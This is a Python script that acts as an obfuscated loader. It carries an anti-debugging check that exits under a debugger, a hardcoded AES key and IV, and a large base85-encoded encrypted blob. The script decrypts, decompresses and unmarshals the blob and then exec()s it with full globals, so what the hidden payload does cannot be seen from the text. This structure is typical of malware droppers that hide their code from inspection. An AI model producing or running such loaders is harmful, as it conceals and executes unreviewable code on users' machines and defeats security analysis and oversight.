
import sys
import os
import base64
import hashlib
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'\xaf\xc48\xb5\xfdq\xc1\xb5\xf3\xc5\xa0\x84\x96:d\xf4\x1b\x03Uq\x02\xf6\xe8S\xad\x9e\x19\x02G\xf2:_'
_IV = b'\xfd\x04\xa4\x1b \x16P\xb8\x00\xaa\xebgw\xc2\xdd\xcb'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except:
        return ""

def _main():
    try:
        _encrypted = 'plP=hQsUH6)HqhG0_B}D1+#{Q`0km3!NtV}iWEC`IU5Fm0;-Ve@R7}X+QC*0dA*Bl)GhGfFsWRJ@_R^jLF9z^$iZGG8@jlUh;H(xgP#~HUdzm<#zCIj9>#y>GWu<$>$pexb55U1+9hfD8t-Qk)4{KH(n_-#0SeDH%P0K87>fGnbTt!dUpQAy<(z6Mz|C)ptL(yqDeSfblZO?Ov;$jvVb<kP+9*hw-b*?Xqu^-TS|$*c9x_|fxQ@okC%q4d`if3KacWw>%q+v*62VHWV-0v!L&sYGAj4oADcl9y={2$d?+2Ia(SMfLtEvHZg)42LzA5h-f3Un?E?I)o^k3cd`mYDu_A@6?iftY=o!v5~GI=`7ulHT_LW1=G?sto1M<R${tup`|JM&aRV$E%}<L9@-opZ_>U_BiB{EGN{zt6$0U*ln{x0P1PQxg%2KiCwJS*z7e26Hd)ZuJISg-||_Lch;M<$ag(>Ro?EGmfv~*dVMwAw{j1Qa66||7Hgy`cA6-niyv?om|TKGKSbKTOwFtnxG)grlBQmAW*pqPzyDEsn7kVZ%+=|;4&P4S-z?FIE~cy$i*Ea*;t`wDIDiS&~8&Hh;!V7<#0iofE?LYSCHIVd`|8R>q+lB-Rl9JGy8lsF31Mx6e8`CnoT4`s}j#^oI)tMb4cUMz4W_c0%YdZRR~P8(8{4Pqo*DrB8-?ascB4FC~08eVQ-9oSc`6}aud$okO8gx+lY<|^C?Xm8o!9!Kg?4xddN5f+o-q!0-Y982+7j(beLxLd$gZATB3v{X3rB|Tu9-baK@XhRUH1O-Ck2UG#{20b?YCV&<H1dYw}|umE-u4UfaqVr8}>raCHpy0>scJ-0st11gIl=-M{NQE2}QQ_hI5fUL`u1q4v3*RbeYaB!*#bESk)gUAYQo31{4J!B=jFc#(wmtW=&tqE^X!F~AL8RFH+;wUOX?HQT{=6+k-=P^NW&)}D2O9)+Hj3iZiqlFm^1k!D3r6`CvXNQS<i0n&+Ec?@pMYmytw6gkO%Mv7KFosPFsQJHa`dqk44f<QOAPvAc<6*|+#*v1P?tJG$4G5)Y#bQLSBTk>;13appE@_<#qUs87I%T3o8&FGTYKs&hft0B~iq&OWdcu%pc{NMz!?`I-3OsbgHm4nCAgApoQx8W54M7<yWe=@Tnz8@!HtOb#@?qr=w{i4!_p)b{B7sEqA!*kkvwtmuMY3!Qv914f632~}(?Hk#c?M{NDVJ~qfNIRiT4Hld-h2PA8iGB#W8b@BuXB%D-&a(nDYb$WKNk>aXl8>AfhZtZ4Ik#JUS!MA@-)c6^p`LOm27sLx=yBR_mL;i0z$3~=uVRN8GJp#EI}(AIZ+E)#L7SqZY%zkln8!ewbWgBmqW-=kc69p99=j*@UWtQOy!gWaytGn_C-ToKgOPSs->av=R`9&w2MNkiBh%1&9kMtnwcPCjl8AB&BJcR7IUf}2T!l9ky^|X4?24z{hvW5Wlmto2mikNkzEZY)%JdzL*MVFb*3XpC>5Oo#KvXoE%V4f>N$|TG(MgEhrAbnrh#CXx$hnCFSRYL|BSfGaPx!@xGmXZtgsUP81{E2iQd4_aNxCs*jy{cF7eA1AFxeGrTHZ0$;KuY#I#(=QTv6gGnrDD6S!(&E?SGhazcP?~TI4I~-!Y2iwIEW+loPc)E%S(rmhsFw+x#XsTT&VUDCBXU_x|^jO%0k??&f~ZS!x*aaeFZx=d5bQx^zDiWS#|0Bf?Di-z7uXoP#&?gA;z>t<UPJ8z^@aW+~4B^RktUL2n9Ef%ucB+7BM4RT1B)N<<MLt-6dw-JOxSfTd<_2!n@pBmp~U2vjnbfA^**Pab9~LxHhBDpFP!|4Gc}j_HcLSy>>B&~VG1iV%3gdSWJ;DM{9A6(v`%M^=j`NUB1-NSG~jB9mi;pzW4jm`=4*vpTY4SkMWoHJ0PIl3AMAZ#D{Wr?!*UNqR&#=cv$EX7}#LY@Oi11aAhT=7e`S29uZRMjL$|o@CjXOgZYyXp3Q1i*=H@N$)K`Oam@JyamdoMZJn?*ja^yK*jpB09zFwGg~a?u}A8h@}&YEW@TMU&XaVRJ@GzG!K9kG^dv{#v8Np@EEjwQha4JQREwNiYez~tGK1NmLU)22)|A>J(KEKa>{#~<R?hcOy8k%7v1&H=TvUvMGWcuYozXlBgny8aYZ}>9EIhfLfpAsIAHJ-0SF}8HQPQ9dcb%oYbyrAh*OI9uKCw)7E3)adxyP8oCVKHrW=It9oPIo7mV2vVzRCG=LEpM+>^rk$_|>pf?@s4Y7SMQeIw;#Juh~MiHscAoxoM3{$Z55FEtvFU@Me;S`=tPk);#vuO4l{2*Xq78@^DFWi(gIN9K3Ql8sZbh!icm{U?WbEjwu;VOe&S_BE+WCB_jIKvJFv1Zhc}5@z|i!k>04ud@iy`!<`Fd+#~CpJ^nir24%{B&2`vJz~t4U$mTm^c*{Zm;3vHKH-%FG5CDVx;9Jsqb9>tfo`fMfW;8@hyzsdlzIc}R!&D-&+=S~^in%EfD?OaCi$HZ}BZmMbTv{A78QY}Rba*ptZvmLb6?UHKZg63&zN9TKM-t_-&4@zZl=i4FgS)VH^evd<1iB<|EiitDvm+H7vGxz68Xy3NrMPSX_Y*bdPGU}Mw)d%on#{#IZE7j#Fl2z{!dNdPj}o0c6o$QWXmF1jTE>~IE66HmD{*d1D33g%c>`lL3XYU-_)#rW;(NkNlV9C9Du6C)ig}O`SyuFHof;YNcgfL^VrAo%Y9$1p6VL3Jl(*Q&k13&81O%t=x)6;VSK!|{V&Gj+%SK|>RxLT&qV{cssc6k;^@^f=yLqBKq^xZLG`VDNY?e$3#gKoHe*g~gqq~Qe_pizoxuI0)&jZr3fkE5*Juqj*y2SKt+9#sl*^-@+1NdRq`?P%k$&qiJD}`iYoE8(Jq(x;vgv3T_>Q;;&9axl>1=~OF+45B-wGZksNn`^jIQ@WC#4bikMV)qXx**#B>v19r!4{vKXt_qM%)BtGjKyFr`G<ei`(a^)v*J3?Ht&WF@x^hmSg&=qKOh&wiQM0q*v#_5%RQ;c5wtYrhpGOeqx_a*FMs6s6FerIktuE|1t&26?n6fu5*d>W>LBe)W`WIeCIF13SE%d%eXZNBCILMSSGGzfN={+jdOM{dRtp-(nziyNnftz^%w+%!DvG_<q4TgR8x@+!iI$X-YkWwH?dBuqKCl)(9caCZ^~QErWSRY@D1L)zSPKMMso0z<GbY#|)#2_CKU&hJYGu>H5v#ouj4oLag6R1!e+!08ZUAXQHZb*IO!^+Vh>{$%n<hXbZl|}oDG31ZpZ!tuz<>KLTIt@$7)FJyMtA^;LTb?rpkL}p1>ZJ~wkiXWD?9lsui93k@9&U7OrNp~&8dhPR=us%wN0X=^Noshx)e<KHCWRVNKgO1)*}fmRbXhS><Keih&np3U0`IrXapA1C3RBlLyRP=idh32fUU~pg1^WkN5`2JzXn<Xmb8;O7cU!^Mo^4bUDMpc!Pe4;2fu9YB^5-sWjc<tzY2ggtjv5LBYD}c<(?Ig_r7dO2&;B>>?#IVZwXZ|G_iO&sT$z(e{~C18Wwso!EUVWtP|CRM=&12%S|7)b*A<k)y|g;YK)nm{ZGcc$#Nx5BK7n*V<PXD;t62P|HwY;S3<$qRrHyimdX~2)du9?rGc&JEeV|JCp{uDD;ZtH2O}IQZ<}wbi<m?BE0+eh+7EJ`ZM5g}2{D3J=VHYZWfpZ*9`e#tcpiI_V{2#Vic5rdaVc_*l_hIOJAnjBwUfHAkZWWXR|&94;}w%X4cMrA5PbTxz5-8njnj(d#*#J_zJ{p`T98O`g;gfCe~8HDYn}Ld#Y(arj28Z?eqGCny&)&|+7fj->$-E=Z;Dr;=b;v^={Q&NB$LIv510d-slJN>7y4!}q@+1889@c6|HPK}*SWq5Ro<;{cg&M7J>h?~L==#~{gzX~Ck<}_wS>N-@(w@b!B8)mI!`bHwcKpsT-Q9$u%KVrExFU&Nri5p(_cfV2<mak`8$Q^x%NUWJO`ZbFAt7}u(!dH<%s{b3{IeCv_K;Uf<MBv;CT!g4(r8{RA@nZvJB2oF~es^=-eh-4B6!;g)z%z64Sw&xC>eTgo|j3I$Qx8tihJh?}tv8i;hu`iBR8ihv<`~9(D-O#*I!4Fk_-6HLvfBqx&UdbkMG(Uok9&23~~3w=Mr{7H^HIu)MyVvq}xMz6xhWL611hg)Q(fN<`%GXXUBYbXRn9o4YSJ{A=V6&s?$y>12|JP`AYnzX%qOpfUa))bm%<h1?ntxzV?|><t&@l|QicFGkxpzb3T;b1KjxoQUy2&q~7CdJ!C@jv>kmzKWYI8|E?+kcN34P{9=qNkb2B?*YjUyN;iPQ&P(U$s^CsS8+cdU2<GC?}&4IGv4IydRI;`D=w`1M&<l8i5nUe6CCBDz+4Mnnz&qSRXKP17Sx8VZ+por^73Uy+{d`|`UYDkXc2LLKioo&Z+XJlHZcL;HmeE7D=ai}?6CJ!QS$R$rA=tnH#T(*`b@D#s(HN%(<(eec??7|#rXY7v!v_~+d1V#r>dvdPMC%rte~GAK7KAz(w5i%L!Oog$}gikIaNu2?jRRIcRt37cg$$aM(QOB4D;@8$}AlgJDt(LDe*y}z%PMA7l&g>RkcLRZVXCI5bX^Jvc^4RRq1TNlvTju^*De=rGh0dPsQsbmip_^)xDBr56>TE!G)vtX>W9>;WV1*UqWNpVN^BPI@6@U3Zs)AnXg7QI?y5EDLacY{7(j|oj3}@X>Xw%uE~X5bzn-;iA$vBEyIBb8-I5Ks;82clB#Xoq@F(|Q<am6vym9oZ+|p+^RnkCrh4QyHE0&I3Jw%XmJ7w|LHLE+26c|ChDU0@Uqs|jeGc(aWGxF=eqdqJJCxUnT3|mo&Zs~o8jwHn3j|R>V5m&zyf0!cwtt009yV99ZeiK^n2msoOPV3~-a&Jmw7LPxbMQ5pq6s-iT-sp!JupBEwV1yx^;Gk_CdwJvw9LZTYnr#hv>_M}If<=Q%wHJ$`Ip*eCsv#Afn$tPavL%#QCje3JuKfNzoGZ0j5z4NJye=JnK7z%xqw%W8C|un2$PQ$C{YHfpr>pj*?pO%2F&r>7+)j+Usr_!c74AxN#}}B$!6A^cA1?<wy}v7>b!qv@$8DP?9ZqT>y;-k|D5&;a<=WY*(@BMMP$ge-RUIy5iV*KK*n0Cb@pfvt|`Dk)XDPGhke5po@N6$(XkXz4o~=JK_;?IM?aY5yN27V@!$C}$zD3)w!G@B>b2|>636ipnF>tqFOWbia~9~vB!J2LlHS@`-ise&RnwYW5U%^JE}0WW*AxSkNzG0RV0<?3%>iR#Cn&56J6(N5_%N&>*!)S%RPD-b7$A8EOO;}u=AyvUsg~MmzW-zfWar+R2YP`K5f+0YnvJHfoVyMvFKV%(hZp$MW)r{d)+bLOJI3Kkpg}xctk$SF+O$0`G)VdYIik7%Q*M{ZWdY}wm?qq%FDC#KA^2b25uF0G&itL!%8Tcg+;Bz}-FwMkq8_G{MRnM4+I=}>F2;NKpf~|(qJB{;YGRqX0@?L%q8ILGAP%coRhf?upK#vCZSMf2jep?t>eWvf+6=<U%=v9umthf0!mu7GcP)xav-WAE*F0EHno<*3xMZJ!5V)yY&0;3t4`U#LZP$D+><TMdHijZJP92sH!5MNp<RH8+xeH|{HsqY%w#&OH`xFX;Mve=%ssQbZ5>a-Q?<^wcQyW<TXHkY$o3!OquoLO-u_QU<o4C&nA7_=-Ytf+%Qbo8lMEN*$>#J-NuggY$<VqLc5l;TsJtslx_W?A(f`3`xZ>CC<zW42$3YjKJjnJ@u;e+DApH{*<v@^63)Qixyggc}gl2e<o)Aerfr(ac(${y!<-C$*P>9L{_*<PG-or`c%_2|rSQ9ja%q?i)}@@!UM&~w_;0#H(XSIQ{tXF@B-O}bElarY(g0Is+Nx!KAJ^o7znM%tJCfTJrqp0nRYSz~zK`-%Me7`v&O?zR-p!4PHW#EHcfv@{`<$@1dtqfKrp0&>VnZiQTIAbeH5O<}?YW?>Y4Z2{QtOc4k;kN{m66t|3x?cW2#;$((>fF1=#c`+{{Ag_>Q)e_-pLOhIku+|&(`=t9|^^)KY9~&tXZdSVo;Ma67-KSG_w;d=gXmyZiz$@4b&9Qk6UBy`XW!el@<6APz6jP7#NTXqaEbd{wd~4fa(3_<<t^O%ndE3jj<&FALxxkJPf}4~9WTae$|9zjA&4WEAJZkfv^$L!Qtkj$c-CHQ{7L6_Pb$1z|+PgZ9_hm~-LXqtphJp@m&klDuZmf^8eIFeH9S`UpB(M~V!9-#7z{f(~SGP&*BGK9#XImlosb!n8Bj4K`GH4V2;{qo0P)~~tsn>!4I@WQqiIhbfnI9f`DXDc#1SbUS(n)L6vnDdMpb9omcRGuG6}FGL`&AJXWfL8HJaFZyL>yfHpALYrp<#8li_Ub2SHUZ7F><$N-sAfjbs1+fSoz(3PFkRGHsq3y9E@4G#Zr47w3zebp3DYK!mwt^R7joun8x`N<zhruKm2u@V)z7JdP9eVJO6$ntf_WOZE}?Lf6!vJP+J1Tv2#`ITz#!%_{d2?lB?nQ(#=O04NK}gOa^&i4)ingzHJ_Y)r70Tj9RGVq6-dRJzqKzM*6j%S1^-K@+e_9j*9A2|72$$szGKidviF#T?tw5#jk#<^z4Q}OviA89Tzv9zYsuCg&>{EDmoSwwr=_WLvBhr*#%ZAdu5|zMFL+!JHLqqJMF_<tz_=Au6Opl*;*1GGw|%p6G?xWyKXbx`Fla3HzjJDC2X!sI8JB1p)+{`m>E)4tn|dERKk!6;~3l+cKp(Iu?KLb-TL#2xM37MX-rbqY^^Sfy0(jp_xNEhd!9ES=j9k^LjYx!ni#A+%~nmU_RF7763Rg|kd(_G2`z+^6oj<Czam4pjlX?YO~f&bdzjMN?ZWr+7Mg@!lQ!NH3ptzSoteu1O@pm?lRQUR3eHl3O^2vw2-RLpf{Su+Xtll){spe!8>N{pBdk98UK;5oqZBNbF2?x`N?0?mC*q%<G5mmSTxAo6yhb!^tf+O4$A8xU4b;dBRGXT6w~1^m8S4m|O_fb0?EBNn-7Kx!8zBvB5^w4h<QL4?rQ6oG_C3yA`Mk2?U(h!=i@f;mx<5mcnnzb;sji$55G({+4lag^hr1pRowIAxoL*LSv|7vZHl8`gYhd;1-uyUFuDtKP@_aO}F05cBfxHi|Pzt`dz*Y<@OYR^+'
        
        # Decryption steps
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        exec(marshal.loads(decompressed_data), {
            **globals(),
            '__name__': '__main__',
            '__builtins__': __builtins__,
            '_decrypt_str': _decrypt_str
        })
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    _main()
        